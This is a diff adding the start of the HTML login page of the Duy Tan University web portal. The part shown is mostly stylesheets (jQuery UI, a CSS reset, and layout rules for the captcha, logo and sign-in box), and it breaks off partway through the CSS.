@@ -1,0 +1,882 @@
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head id="Head1"><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+	Cổng thông tin Đại học Duy Tân - Đà Nẵng - Việt Nam
+</title>
+    <meta name="Description" content="Bằng bản lĩnh Việt Nam, phát huy truyền thống của phong trào Duy Tân xưa, đại học Duy Tân huy động tối đa nội lực, hợp tác chặt chẽ với các trường đại học, doanh nghiệp, cá nhân trong và ngoài nước, phấn đấu trở thành Đại học đa ngành, đa cấp nhằm đào tạo nguồn nhân lực đạt đẳng cấp quốc tế trong các lĩnh vực công nghệ, kỹ thuật và kinh tế phục vụ cho sự nghiệp công nghiệp hoá và hiện đại hoá đất nước." />
+    <link rel="Shortcut Icon" href="images/DTU.ICO" type="image/x-icon" />
+    <style type="text/css">
+        #box-captcha {
+            padding: 0 !important;
+        }
+
+        .floatbox {
+            float: left;
+            background-color: transparent !important;
+            padding: 0 !important;
+            margin-top: -1px;
+        }
+
+        .captcha {
+            text-transform: uppercase;
+        }
+
+        .floatbox img {
+            width: 120px;
+            height: 22px;
+            margin-top: 2px !important;
+            margin-left: 4px;
+        }
+
+        .captcha_f5 {
+            cursor: pointer;
+            float: right;
+            margin-top: 6px;
+        }
+
+        #form .btn {
+            bottom: 11px;
+            right: 20px;
+        }
+
+        #Container {
+            padding: 0 !important;
+            position: relative;
+            float: right;
+        }
+
+        #UpdatePanel1 {
+            padding: 0 !important;
+            float: right;
+            width: 130px;
+        }
+    </style>
+    <style>
+.ui-helper-hidden{display:none}.ui-helper-hidden-accessible{position:absolute;left:-99999999px}.ui-helper-reset{margin:0;padding:0;border:0;outline:0;line-height:1.3;text-decoration:none;font-size:100%;list-style:none}.ui-helper-clearfix:after{content:".";display:block;height:0;clear:both;visibility:hidden}.ui-helper-clearfix{display:inline-block}* html .ui-helper-clearfix{height:1%}.ui-helper-clearfix{display:block}.ui-helper-zfix{width:100%;height:100%;top:0;left:0;position:absolute;opacity:0;filter:Alpha(Opacity=0)}.ui-state-disabled{cursor:default!important}.ui-icon{display:block;text-indent:-99999px;overflow:hidden;background-repeat:no-repeat}.ui-widget-overlay{position:absolute;top:0;left:0;width:100%;height:100%}.ui-accordion{width:100%}.ui-accordion .ui-accordion-header{cursor:pointer;position:relative;margin-top:1px;zoom:1}.ui-accordion .ui-accordion-li-fix{display:inline}.ui-accordion .ui-accordion-header-active{border-bottom:0!important}.ui-accordion .ui-accordion-header a{display:block;font-size:1em;padding:.5em .5em .5em .7em}.ui-accordion-icons .ui-accordion-header a{padding-left:2.2em}.ui-accordion .ui-accordion-header .ui-icon{position:absolute;left:.5em;top:50%;margin-top:-8px}.ui-accordion .ui-accordion-content{padding:1em 2.2em;border-top:0;margin-top:-2px;position:relative;top:1px;margin-bottom:2px;overflow:auto;display:none;zoom:1}.ui-accordion .ui-accordion-content-active{display:block}.ui-autocomplete{position:absolute;cursor:default}* html .ui-autocomplete{width:1px}.ui-menu{list-style:none;padding:2px;margin:0;display:block;float:left}.ui-menu .ui-menu{margin-top:-3px}.ui-menu .ui-menu-item{margin:0;padding:0;zoom:1;float:left;clear:left;width:100%}.ui-menu .ui-menu-item a{text-decoration:none;display:block;padding:.2em .4em;line-height:1.5;zoom:1}.ui-menu .ui-menu-item a.ui-state-hover,.ui-menu .ui-menu-item a.ui-state-active{font-weight:400;margin:-1px}.ui-button{display:inline-block;position:relative;padding:0;margin-right:.1em;text-decoration:none!important;cursor:pointer;text-align:center;zoom:1;overflow:visible}.ui-button-icon-only{width:2.2em}button.ui-button-icon-only{width:2.4em}.ui-button-icons-only{width:3.4em}button.ui-button-icons-only{width:3.7em}.ui-button .ui-button-text{display:block;line-height:1.4}.ui-button-text-only .ui-button-text{padding:.4em 1em}.ui-button-icon-only .ui-button-text,.ui-button-icons-only .ui-button-text{padding:.4em;text-indent:-9999999px}.ui-button-text-icon-primary .ui-button-text,.ui-button-text-icons .ui-button-text{padding:.4em 1em .4em 2.1em}.ui-button-text-icon-secondary .ui-button-text,.ui-button-text-icons .ui-button-text{padding:.4em 2.1em .4em 1em}.ui-button-text-icons .ui-button-text{padding-left:2.1em;padding-right:2.1em}input.ui-button{padding:.4em 1em}.ui-button-icon-only .ui-icon,.ui-button-text-icon-primary .ui-icon,.ui-button-text-icon-secondary .ui-icon,.ui-button-text-icons .ui-icon,.ui-button-icons-only .ui-icon{position:absolute;top:50%;margin-top:-8px}.ui-button-icon-only .ui-icon{left:50%;margin-left:-8px}.ui-button-text-icon-primary .ui-button-icon-primary,.ui-button-text-icons .ui-button-icon-primary,.ui-button-icons-only .ui-button-icon-primary{left:.5em}.ui-button-text-icon-secondary .ui-button-icon-secondary,.ui-button-text-icons .ui-button-icon-secondary,.ui-button-icons-only .ui-button-icon-secondary{right:.5em}.ui-button-text-icons .ui-button-icon-secondary,.ui-button-icons-only .ui-button-icon-secondary{right:.5em}.ui-buttonset{margin-right:7px}.ui-buttonset .ui-button{margin-left:0;margin-right:-.3em}button.ui-button::-moz-focus-inner{border:0;padding:0}.ui-datepicker{width:17em;padding:.2em .2em 0}.ui-datepicker .ui-datepicker-header{position:relative;padding:.2em 0}.ui-datepicker .ui-datepicker-prev,.ui-datepicker .ui-datepicker-next{position:absolute;top:2px;width:1.8em;height:1.8em}.ui-datepicker .ui-datepicker-prev-hover,.ui-datepicker .ui-datepicker-next-hover{top:1px}.ui-datepicker .ui-datepicker-prev{left:2px}.ui-datepicker .ui-datepicker-next{right:2px}.ui-datepicker .ui-datepicker-prev-hover{left:1px}.ui-datepicker .ui-datepicker-next-hover{right:1px}.ui-datepicker .ui-datepicker-prev span,.ui-datepicker .ui-datepicker-next span{display:block;position:absolute;left:50%;margin-left:-8px;top:50%;margin-top:-8px}.ui-datepicker .ui-datepicker-title{margin:0 2.3em;line-height:1.8em;text-align:center}.ui-datepicker .ui-datepicker-title select{font-size:1em;margin:1px 0}.ui-datepicker select.ui-datepicker-month-year{width:100%}.ui-datepicker select.ui-datepicker-month,.ui-datepicker select.ui-datepicker-year{width:49%}.ui-datepicker table{width:100%;font-size:.9em;border-collapse:collapse;margin:0 0 .4em}.ui-datepicker th{padding:.7em .3em;text-align:center;font-weight:700;border:0}.ui-datepicker td{border:0;padding:1px}.ui-datepicker td span,.ui-datepicker td a{display:block;padding:.2em;text-align:right;text-decoration:none}.ui-datepicker .ui-datepicker-buttonpane{background-image:none;margin:.7em 0 0;padding:0 .2em;border-left:0;border-right:0;border-bottom:0}.ui-datepicker .ui-datepicker-buttonpane button{float:right;margin:.5em .2em .4em;cursor:pointer;padding:.2em .6em .3em;width:auto;overflow:visible}.ui-datepicker .ui-datepicker-buttonpane button.ui-datepicker-current{float:left}.ui-datepicker.ui-datepicker-multi{width:auto}.ui-datepicker-multi .ui-datepicker-group{float:left}.ui-datepicker-multi .ui-datepicker-group table{width:95%;margin:0 auto .4em}.ui-datepicker-multi-2 .ui-datepicker-group{width:50%}.ui-datepicker-multi-3 .ui-datepicker-group{width:33.3%}.ui-datepicker-multi-4 .ui-datepicker-group{width:25%}.ui-datepicker-multi .ui-datepicker-group-last .ui-datepicker-header{border-left-width:0}.ui-datepicker-multi .ui-datepicker-group-middle .ui-datepicker-header{border-left-width:0}.ui-datepicker-multi .ui-datepicker-buttonpane{clear:left}.ui-datepicker-row-break{clear:both;width:100%}.ui-datepicker-rtl{direction:rtl}.ui-datepicker-rtl .ui-datepicker-prev{right:2px;left:auto}.ui-datepicker-rtl .ui-datepicker-next{left:2px;right:auto}.ui-datepicker-rtl .ui-datepicker-prev:hover{right:1px;left:auto}.ui-datepicker-rtl .ui-datepicker-next:hover{left:1px;right:auto}.ui-datepicker-rtl .ui-datepicker-buttonpane{clear:right}.ui-datepicker-rtl .ui-datepicker-buttonpane button{float:left}.ui-datepicker-rtl .ui-datepicker-buttonpane button.ui-datepicker-current{float:right}.ui-datepicker-rtl .ui-datepicker-group{float:right}.ui-datepicker-rtl .ui-datepicker-group-last .ui-datepicker-header{border-right-width:0;border-left-width:1px}.ui-datepicker-rtl .ui-datepicker-group-middle .ui-datepicker-header{border-right-width:0;border-left-width:1px}.ui-datepicker-cover{display:none;display//:block;position:absolute;z-index:-1;filter:mask();top:-4px;left:-4px;width:200px;height:200px}.ui-dialog{position:absolute;padding:.2em;width:300px;overflow:hidden}.ui-dialog .ui-dialog-titlebar{padding:.5em 1em .3em;position:relative}.ui-dialog .ui-dialog-title{float:left;margin:.1em 16px .2em 0}.ui-dialog .ui-dialog-titlebar-close{position:absolute;right:.3em;top:50%;width:19px;margin:-10px 0 0;padding:1px;height:18px}.ui-dialog .ui-dialog-titlebar-close span{display:block;margin:1px}.ui-dialog .ui-dialog-titlebar-close:hover,.ui-dialog .ui-dialog-titlebar-close:focus{padding:0}.ui-dialog .ui-dialog-content{position:relative;border:0;padding:.5em 1em;background:none;overflow:auto;zoom:1}.ui-dialog .ui-dialog-buttonpane{text-align:left;border-width:1px 0 0;background-image:none;margin:.5em 0 0;padding:.3em 1em .5em .4em}.ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset{float:right}.ui-dialog .ui-dialog-buttonpane button{margin:.5em .4em .5em 0;cursor:pointer}.ui-dialog .ui-resizable-se{width:14px;height:14px;right:3px;bottom:3px}.ui-draggable .ui-dialog-titlebar{cursor:move}.ui-progressbar{height:2em;text-align:left}.ui-progressbar .ui-progressbar-value{margin:-1px;height:100%}.ui-resizable{position:relative}.ui-resizable-handle{position:absolute;font-size:.1px;z-index:99999;display:block}.ui-resizable-disabled .ui-resizable-handle,.ui-resizable-autohide .ui-resizable-handle{display:none}.ui-resizable-n{cursor:n-resize;height:7px;width:100%;top:-5px;left:0}.ui-resizable-s{cursor:s-resize;height:7px;width:100%;bottom:-5px;left:0}.ui-resizable-e{cursor:e-resize;width:7px;right:-5px;top:0;height:100%}.ui-resizable-w{cursor:w-resize;width:7px;left:-5px;top:0;height:100%}.ui-resizable-se{cursor:se-resize;width:12px;height:12px;right:1px;bottom:1px}.ui-resizable-sw{cursor:sw-resize;width:9px;height:9px;left:-5px;bottom:-5px}.ui-resizable-nw{cursor:nw-resize;width:9px;height:9px;left:-5px;top:-5px}.ui-resizable-ne{cursor:ne-resize;width:9px;height:9px;right:-5px;top:-5px}.ui-selectable-helper{position:absolute;z-index:100;border:1px dotted #000}.ui-slider{position:relative;text-align:left}.ui-slider .ui-slider-handle{position:absolute;z-index:2;width:1.2em;height:1.2em;cursor:default}.ui-slider .ui-slider-range{position:absolute;z-index:1;font-size:.7em;display:block;border:0;background-position:0 0}.ui-slider-horizontal{height:.8em}.ui-slider-horizontal .ui-slider-handle{top:-.3em;margin-left:-.6em}.ui-slider-horizontal .ui-slider-range{top:0;height:100%}.ui-slider-horizontal .ui-slider-range-min{left:0}.ui-slider-horizontal .ui-slider-range-max{right:0}.ui-slider-vertical{width:.8em;height:100px}.ui-slider-vertical .ui-slider-handle{left:-.3em;margin-left:0;margin-bottom:-.6em}.ui-slider-vertical .ui-slider-range{left:0;width:100%}.ui-slider-vertical .ui-slider-range-min{bottom:0}.ui-slider-vertical .ui-slider-range-max{top:0}.ui-tabs{position:relative;padding:.2em;zoom:1}.ui-tabs .ui-tabs-nav{margin:0;padding:.2em .2em 0}.ui-tabs .ui-tabs-nav li{list-style:none;float:left;position:relative;top:1px;margin:0 .2em 1px 0;border-bottom:0!important;padding:0;white-space:nowrap}.ui-tabs .ui-tabs-nav li a{float:left;padding:.5em 1em;text-decoration:none}.ui-tabs .ui-tabs-nav li.ui-tabs-selected{margin-bottom:0;padding-bottom:1px}.ui-tabs .ui-tabs-nav li.ui-tabs-selected a,.ui-tabs .ui-tabs-nav li.ui-state-disabled a,.ui-tabs .ui-tabs-nav li.ui-state-processing a{cursor:text}.ui-tabs .ui-tabs-nav li a,.ui-tabs.ui-tabs-collapsible .ui-tabs-nav li.ui-tabs-selected a{cursor:pointer}.ui-tabs .ui-tabs-panel{display:block;border-width:0;padding:1em 1.4em;background:none}.ui-tabs .ui-tabs-hide{display:none!important}.ui-widget{font-family:Verdana,Arial,sans-serif;font-size:1.1em}.ui-widget .ui-widget{font-size:1em}.ui-widget input,.ui-widget select,.ui-widget textarea,.ui-widget button{font-family:Verdana,Arial,sans-serif;font-size:1em}.ui-widget-content{border:1px solid #aaa;background:#fff url(images/ui-bg_flat_75_ffffff_40x100.png) 50% 50% repeat-x;color:#222}.ui-widget-content a{color:#222}.ui-widget-header{border:1px solid #aaa;background:#ccc url(images/ui-bg_highlight-soft_75_cccccc_1x100.png) 50% 50% repeat-x;color:#222;font-weight:700}.ui-widget-header a{color:#222}.ui-state-default,.ui-widget-content .ui-state-default,.ui-widget-header .ui-state-default{border:1px solid #d3d3d3;background:#e6e6e6 url(images/ui-bg_glass_75_e6e6e6_1x400.png) 50% 50% repeat-x;font-weight:400;color:#555}.ui-state-default a,.ui-state-default a:link,.ui-state-default a:visited{color:#555;text-decoration:none}.ui-state-hover,.ui-widget-content .ui-state-hover,.ui-widget-header .ui-state-hover,.ui-state-focus,.ui-widget-content .ui-state-focus,.ui-widget-header .ui-state-focus{border:1px solid #999;background:#dadada url(images/ui-bg_glass_75_dadada_1x400.png) 50% 50% repeat-x;font-weight:400;color:#212121}.ui-state-hover a,.ui-state-hover a:hover{color:#212121;text-decoration:none}.ui-state-active,.ui-widget-content .ui-state-active,.ui-widget-header .ui-state-active{border:1px solid #aaa;background:#fff url(images/ui-bg_glass_65_ffffff_1x400.png) 50% 50% repeat-x;font-weight:400;color:#212121}.ui-state-active a,.ui-state-active a:link,.ui-state-active a:visited{color:#212121;text-decoration:none}.ui-widget :active{outline:none}.ui-state-highlight,.ui-widget-content .ui-state-highlight,.ui-widget-header .ui-state-highlight{border:1px solid #fcefa1;background:#fbf9ee url(images/ui-bg_glass_55_fbf9ee_1x400.png) 50% 50% repeat-x;color:#363636}.ui-state-highlight a,.ui-widget-content .ui-state-highlight a,.ui-widget-header .ui-state-highlight a{color:#363636}.ui-state-error,.ui-widget-content .ui-state-error,.ui-widget-header .ui-state-error{border:1px solid #cd0a0a;background:#fef1ec url(images/ui-bg_glass_95_fef1ec_1x400.png) 50% 50% repeat-x;color:#cd0a0a}.ui-state-error a,.ui-widget-content .ui-state-error a,.ui-widget-header .ui-state-error a{color:#cd0a0a}.ui-state-error-text,.ui-widget-content .ui-state-error-text,.ui-widget-header .ui-state-error-text{color:#cd0a0a}.ui-priority-primary,.ui-widget-content .ui-priority-primary,.ui-widget-header .ui-priority-primary{font-weight:700}.ui-priority-secondary,.ui-widget-content .ui-priority-secondary,.ui-widget-header .ui-priority-secondary{opacity:.7;filter:Alpha(Opacity=70);font-weight:400}.ui-state-disabled,.ui-widget-content .ui-state-disabled,.ui-widget-header .ui-state-disabled{opacity:.35;filter:Alpha(Opacity=35);background-image:none}.ui-icon{width:16px;height:16px;background-image:url(images/ui-icons_222222_256x240.png)}.ui-widget-content .ui-icon{background-image:url(images/ui-icons_222222_256x240.png)}.ui-widget-header .ui-icon{background-image:url(images/ui-icons_222222_256x240.png)}.ui-state-default .ui-icon{background-image:url(images/ui-icons_888888_256x240.png)}.ui-state-hover .ui-icon,.ui-state-focus .ui-icon{background-image:url(images/ui-icons_454545_256x240.png)}.ui-state-active .ui-icon{background-image:url(images/ui-icons_454545_256x240.png)}.ui-state-highlight .ui-icon{background-image:url(images/ui-icons_2e83ff_256x240.png)}.ui-state-error .ui-icon,.ui-state-error-text .ui-icon{background-image:url(images/ui-icons_cd0a0a_256x240.png)}.ui-icon-carat-1-n{background-position:0 0}.ui-icon-carat-1-ne{background-position:-16px 0}.ui-icon-carat-1-e{background-position:-32px 0}.ui-icon-carat-1-se{background-position:-48px 0}.ui-icon-carat-1-s{background-position:-64px 0}.ui-icon-carat-1-sw{background-position:-80px 0}.ui-icon-carat-1-w{background-position:-96px 0}.ui-icon-carat-1-nw{background-position:-112px 0}.ui-icon-carat-2-n-s{background-position:-128px 0}.ui-icon-carat-2-e-w{background-position:-144px 0}.ui-icon-triangle-1-n{background-position:0 -16px}.ui-icon-triangle-1-ne{background-position:-16px -16px}.ui-icon-triangle-1-e{background-position:-32px -16px}.ui-icon-triangle-1-se{background-position:-48px -16px}.ui-icon-triangle-1-s{background-position:-64px -16px}.ui-icon-triangle-1-sw{background-position:-80px -16px}.ui-icon-triangle-1-w{background-position:-96px -16px}.ui-icon-triangle-1-nw{background-position:-112px -16px}.ui-icon-triangle-2-n-s{background-position:-128px -16px}.ui-icon-triangle-2-e-w{background-position:-144px -16px}.ui-icon-arrow-1-n{background-position:0 -32px}.ui-icon-arrow-1-ne{background-position:-16px -32px}.ui-icon-arrow-1-e{background-position:-32px -32px}.ui-icon-arrow-1-se{background-position:-48px -32px}.ui-icon-arrow-1-s{background-position:-64px -32px}.ui-icon-arrow-1-sw{background-position:-80px -32px}.ui-icon-arrow-1-w{background-position:-96px -32px}.ui-icon-arrow-1-nw{background-position:-112px -32px}.ui-icon-arrow-2-n-s{background-position:-128px -32px}.ui-icon-arrow-2-ne-sw{background-position:-144px -32px}.ui-icon-arrow-2-e-w{background-position:-160px -32px}.ui-icon-arrow-2-se-nw{background-position:-176px -32px}.ui-icon-arrowstop-1-n{background-position:-192px -32px}.ui-icon-arrowstop-1-e{background-position:-208px -32px}.ui-icon-arrowstop-1-s{background-position:-224px -32px}.ui-icon-arrowstop-1-w{background-position:-240px -32px}.ui-icon-arrowthick-1-n{background-position:0 -48px}.ui-icon-arrowthick-1-ne{background-position:-16px -48px}.ui-icon-arrowthick-1-e{background-position:-32px -48px}.ui-icon-arrowthick-1-se{background-position:-48px -48px}.ui-icon-arrowthick-1-s{background-position:-64px -48px}.ui-icon-arrowthick-1-sw{background-position:-80px -48px}.ui-icon-arrowthick-1-w{background-position:-96px -48px}.ui-icon-arrowthick-1-nw{background-position:-112px -48px}.ui-icon-arrowthick-2-n-s{background-position:-128px -48px}.ui-icon-arrowthick-2-ne-sw{background-position:-144px -48px}.ui-icon-arrowthick-2-e-w{background-position:-160px -48px}.ui-icon-arrowthick-2-se-nw{background-position:-176px -48px}.ui-icon-arrowthickstop-1-n{background-position:-192px -48px}.ui-icon-arrowthickstop-1-e{background-position:-208px -48px}.ui-icon-arrowthickstop-1-s{background-position:-224px -48px}.ui-icon-arrowthickstop-1-w{background-position:-240px -48px}.ui-icon-arrowreturnthick-1-w{background-position:0 -64px}.ui-icon-arrowreturnthick-1-n{background-position:-16px -64px}.ui-icon-arrowreturnthick-1-e{background-position:-32px -64px}.ui-icon-arrowreturnthick-1-s{background-position:-48px -64px}.ui-icon-arrowreturn-1-w{background-position:-64px -64px}.ui-icon-arrowreturn-1-n{background-position:-80px -64px}.ui-icon-arrowreturn-1-e{background-position:-96px -64px}.ui-icon-arrowreturn-1-s{background-position:-112px -64px}.ui-icon-arrowrefresh-1-w{background-position:-128px -64px}.ui-icon-arrowrefresh-1-n{background-position:-144px -64px}.ui-icon-arrowrefresh-1-e{background-position:-160px -64px}.ui-icon-arrowrefresh-1-s{background-position:-176px -64px}.ui-icon-arrow-4{background-position:0 -80px}.ui-icon-arrow-4-diag{background-position:-16px -80px}.ui-icon-extlink{background-position:-32px -80px}.ui-icon-newwin{background-position:-48px -80px}.ui-icon-refresh{background-position:-64px -80px}.ui-icon-shuffle{background-position:-80px -80px}.ui-icon-transfer-e-w{background-position:-96px -80px}.ui-icon-transferthick-e-w{background-position:-112px -80px}.ui-icon-folder-collapsed{background-position:0 -96px}.ui-icon-folder-open{background-position:-16px -96px}.ui-icon-document{background-position:-32px -96px}.ui-icon-document-b{background-position:-48px -96px}.ui-icon-note{background-position:-64px -96px}.ui-icon-mail-closed{background-position:-80px -96px}.ui-icon-mail-open{background-position:-96px -96px}.ui-icon-suitcase{background-position:-112px -96px}.ui-icon-comment{background-position:-128px -96px}.ui-icon-person{background-position:-144px -96px}.ui-icon-print{background-position:-160px -96px}.ui-icon-trash{background-position:-176px -96px}.ui-icon-locked{background-position:-192px -96px}.ui-icon-unlocked{background-position:-208px -96px}.ui-icon-bookmark{background-position:-224px -96px}.ui-icon-tag{background-position:-240px -96px}.ui-icon-home{background-position:0 -112px}.ui-icon-flag{background-position:-16px -112px}.ui-icon-calendar{background-position:-32px -112px}.ui-icon-cart{background-position:-48px -112px}.ui-icon-pencil{background-position:-64px -112px}.ui-icon-clock{background-position:-80px -112px}.ui-icon-disk{background-position:-96px -112px}.ui-icon-calculator{background-position:-112px -112px}.ui-icon-zoomin{background-position:-128px -112px}.ui-icon-zoomout{background-position:-144px -112px}.ui-icon-search{background-position:-160px -112px}.ui-icon-wrench{background-position:-176px -112px}.ui-icon-gear{background-position:-192px -112px}.ui-icon-heart{background-position:-208px -112px}.ui-icon-star{background-position:-224px -112px}.ui-icon-link{background-position:-240px -112px}.ui-icon-cancel{background-position:0 -128px}.ui-icon-plus{background-position:-16px -128px}.ui-icon-plusthick{background-position:-32px -128px}.ui-icon-minus{background-position:-48px -128px}.ui-icon-minusthick{background-position:-64px -128px}.ui-icon-close{background-position:-80px -128px}.ui-icon-closethick{background-position:-96px -128px}.ui-icon-key{background-position:-112px -128px}.ui-icon-lightbulb{background-position:-128px -128px}.ui-icon-scissors{background-position:-144px -128px}.ui-icon-clipboard{background-position:-160px -128px}.ui-icon-copy{background-position:-176px -128px}.ui-icon-contact{background-position:-192px -128px}.ui-icon-image{background-position:-208px -128px}.ui-icon-video{background-position:-224px -128px}.ui-icon-script{background-position:-240px -128px}.ui-icon-alert{background-position:0 -144px}.ui-icon-info{background-position:-16px -144px}.ui-icon-notice{background-position:-32px -144px}.ui-icon-help{background-position:-48px -144px}.ui-icon-check{background-position:-64px -144px}.ui-icon-bullet{background-position:-80px -144px}.ui-icon-radio-off{background-position:-96px -144px}.ui-icon-radio-on{background-position:-112px -144px}.ui-icon-pin-w{background-position:-128px -144px}.ui-icon-pin-s{background-position:-144px -144px}.ui-icon-play{background-position:0 -160px}.ui-icon-pause{background-position:-16px -160px}.ui-icon-seek-next{background-position:-32px -160px}.ui-icon-seek-prev{background-position:-48px -160px}.ui-icon-seek-end{background-position:-64px -160px}.ui-icon-seek-start{background-position:-80px -160px}.ui-icon-seek-first{background-position:-80px -160px}.ui-icon-stop{background-position:-96px -160px}.ui-icon-eject{background-position:-112px -160px}.ui-icon-volume-off{background-position:-128px -160px}.ui-icon-volume-on{background-position:-144px -160px}.ui-icon-power{background-position:0 -176px}.ui-icon-signal-diag{background-position:-16px -176px}.ui-icon-signal{background-position:-32px -176px}.ui-icon-battery-0{background-position:-48px -176px}.ui-icon-battery-1{background-position:-64px -176px}.ui-icon-battery-2{background-position:-80px -176px}.ui-icon-battery-3{background-position:-96px -176px}.ui-icon-circle-plus{background-position:0 -192px}.ui-icon-circle-minus{background-position:-16px -192px}.ui-icon-circle-close{background-position:-32px -192px}.ui-icon-circle-triangle-e{background-position:-48px -192px}.ui-icon-circle-triangle-s{background-position:-64px -192px}.ui-icon-circle-triangle-w{background-position:-80px -192px}.ui-icon-circle-triangle-n{background-position:-96px -192px}.ui-icon-circle-arrow-e{background-position:-112px -192px}.ui-icon-circle-arrow-s{background-position:-128px -192px}.ui-icon-circle-arrow-w{background-position:-144px -192px}.ui-icon-circle-arrow-n{background-position:-160px -192px}.ui-icon-circle-zoomin{background-position:-176px -192px}.ui-icon-circle-zoomout{background-position:-192px -192px}.ui-icon-circle-check{background-position:-208px -192px}.ui-icon-circlesmall-plus{background-position:0 -208px}.ui-icon-circlesmall-minus{background-position:-16px -208px}.ui-icon-circlesmall-close{background-position:-32px -208px}.ui-icon-squaresmall-plus{background-position:-48px -208px}.ui-icon-squaresmall-minus{background-position:-64px -208px}.ui-icon-squaresmall-close{background-position:-80px -208px}.ui-icon-grip-dotted-vertical{background-position:0 -224px}.ui-icon-grip-dotted-horizontal{background-position:-16px -224px}.ui-icon-grip-solid-vertical{background-position:-32px -224px}.ui-icon-grip-solid-horizontal{background-position:-48px -224px}.ui-icon-gripsmall-diagonal-se{background-position:-64px -224px}.ui-icon-grip-diagonal-se{background-position:-80px -224px}.ui-corner-tl{-moz-border-radius-topleft:4px;-webkit-border-top-left-radius:4px;border-top-left-radius:4px}.ui-corner-tr{-moz-border-radius-topright:4px;-webkit-border-top-right-radius:4px;border-top-right-radius:4px}.ui-corner-bl{-moz-border-radius-bottomleft:4px;-webkit-border-bottom-left-radius:4px;border-bottom-left-radius:4px}.ui-corner-br{-moz-border-radius-bottomright:4px;-webkit-border-bottom-right-radius:4px;border-bottom-right-radius:4px}.ui-corner-top{-moz-border-radius-topleft:4px;-webkit-border-top-left-radius:4px;border-top-left-radius:4px;-moz-border-radius-topright:4px;-webkit-border-top-right-radius:4px;border-top-right-radius:4px}.ui-corner-bottom{-moz-border-radius-bottomleft:4px;-webkit-border-bottom-left-radius:4px;border-bottom-left-radius:4px;-moz-border-radius-bottomright:4px;-webkit-border-bottom-right-radius:4px;border-bottom-right-radius:4px}.ui-corner-right{-moz-border-radius-topright:4px;-webkit-border-top-right-radius:4px;border-top-right-radius:4px;-moz-border-radius-bottomright:4px;-webkit-border-bottom-right-radius:4px;border-bottom-right-radius:4px}.ui-corner-left{-moz-border-radius-topleft:4px;-webkit-border-top-left-radius:4px;border-top-left-radius:4px;-moz-border-radius-bottomleft:4px;-webkit-border-bottom-left-radius:4px;border-bottom-left-radius:4px}.ui-corner-all{-moz-border-radius:4px;-webkit-border-radius:4px;border-radius:4px}.ui-widget-overlay{background:#aaa url(images/ui-bg_flat_0_aaaaaa_40x100.png) 50% 50% repeat-x;opacity:.3;filter:Alpha(Opacity=30)}.ui-widget-shadow{margin:-8px 0 0 -8px;padding:8px;background:#aaa url(images/ui-bg_flat_0_aaaaaa_40x100.png) 50% 50% repeat-x;opacity:.3;filter:Alpha(Opacity=30);-moz-border-radius:8px;-webkit-border-radius:8px;border-radius:8px}
+</style><style>
+ï»¿html,body,div,span,applet,object,iframe,h1,h2,h3,h4,h5,h6,p,blockquote,pre,a,abbr,acronym,address,big,cite,code,del,dfn,em,font,img,ins,kbd,q,s,samp,small,strike,strong,sub,sup,tt,var,b,u,i,center,dl,dt,dd,ol,ul,li,fieldset,form,label,legend,table,caption,tbody,tfoot,thead,tr,th{border:0;outline:0;font-size:100%;vertical-align:baseline;background:transparent;margin:0;padding:0}
+body{line-height:1;font-family:arial;font-size:12px}
+a:link,a:visited{text-decoration:none;color:#4E4D4D}
+ol,ul{list-style:none}
+blockquote,q{quotes:none}
+blockquote:before,blockquote:after,q:before,q:after{content:none}
+:focus{outline:0}
+ins{text-decoration:none}
+del{text-decoration:line-through}
+table{border-collapse:collapse;border-spacing:0}
+.clearfix{display:block;height:0;clear:both}
+</style><style>
+
+</style><style>
+body {
+	background: url(mydtu_assets/images/bg.jpg) left top;
+	/*position: relative;*/
+}
+
+@media screen and (min-width:1001px) {
+	.screen {
+		display: none;
+	}
+}
+
+.screen {
+	height: 35px;
+	margin: 3px 0 0 8px;
+}
+
+	.screen:after {
+		content: " ";
+		display: block;
+		clear: both;
+	}
+
+	.screen img {
+		float: left;
+		margin: 0 0 0 5px;
+		cursor: pointer;
+		width: 24px;
+	}
+
+	.screen .desktop {
+		padding-top: 3px;
+	}
+
+#main-panel {
+	/*height: 100%;*/
+}
+
+#panel {
+	/*width: 960px;
+	margin: 0 auto;*/
+}
+
+.clickSignIn {
+	/*position: absolute;
+	left: 0%;
+	top: 0%;
+	width: 100%;
+	height: 100%;
+	background-color: #000;
+	z-index: 9999;
+	opacity: 0.8;display: block !important;*/
+	
+
+	position: absolute;
+	width: 960px;
+	/*height: 286px;*/
+	height: 331px;
+	left: 50%;
+	top: 40%;
+	margin-left: -480px; /* half of the width  */
+	margin-top: -143px; /* half of the height */
+	background-color: #1E0102;
+	z-index: 9999;
+	opacity: 0.8;
+
+	color: #ffffff;
+	text-align: center;
+	/*line-height: 286px;*/
+	line-height: 331px;
+}
+
+#login {
+	/*position: relative;
+	padding: 18% 0 0 !important;*/
+	position: absolute;
+	width: 960px;
+	/*height: 286px;*/
+	height: 331px;
+	left: 50%;
+	top: 40%;
+	margin-left: -480px; /* half of the width  */
+	margin-top: -143px; /* half of the height */
+	/*background-color: yellow;*/
+}
+
+#top {
+	position: relative;
+	width: 960px;
+	height: 60px;
+}
+
+#logo {
+	position: absolute;
+	left: 45px;
+	top: 0;
+	background: url(mydtu_assets/images/all-images-on-signin-page.png) 0 -191px no-repeat;
+	height: 60px;
+	width: 250px;
+}
+
+	#logo a {
+		color: #fff;
+		font-weight: 700;
+		text-indent: -9999px;
+		height: 60px;
+		width: 250px;
+		display: block;
+	}
+
+#language {
+	position: absolute;
+	top: 40px;
+	right: 22px;
+	/*width: 120px;*/
+}
+#language a.forgotpass {
+			background: url(mydtu_assets/images/question.png) left center no-repeat;
+			padding-left: 19px;
+		}
+
+			#language a.feedback {
+				background: url(mydtu_assets/images/info.png) left center no-repeat;
+				padding-left: 19px;
+				padding-right: 5px;
+				margin-left: 5px;
+			}
+	#language a {
+		display: block;
+		height: 16px;
+		line-height: 16px;
+		float: left;
+		font-size: 11px;
+		color: #fff;
+	}
+
+	#language .vn {
+		background: url(mydtu_assets/images/all-images-on-signin-page.png) -32px -72px no-repeat;
+		padding-left: 20px;
+		margin-right: 10px;
+	}
+
+	#language .en {
+		background: url(mydtu_assets/images/all-images-on-signin-page.png) -32px -55px no-repeat;
+		padding-left: 20px;
+		margin-right: 10px;
+	}
+
+	#language .bluetheme {
+		background: url(mydtu_assets/images/bluetheme.png) left center no-repeat;
+		text-indent: -99999px;
+		width: 13px;
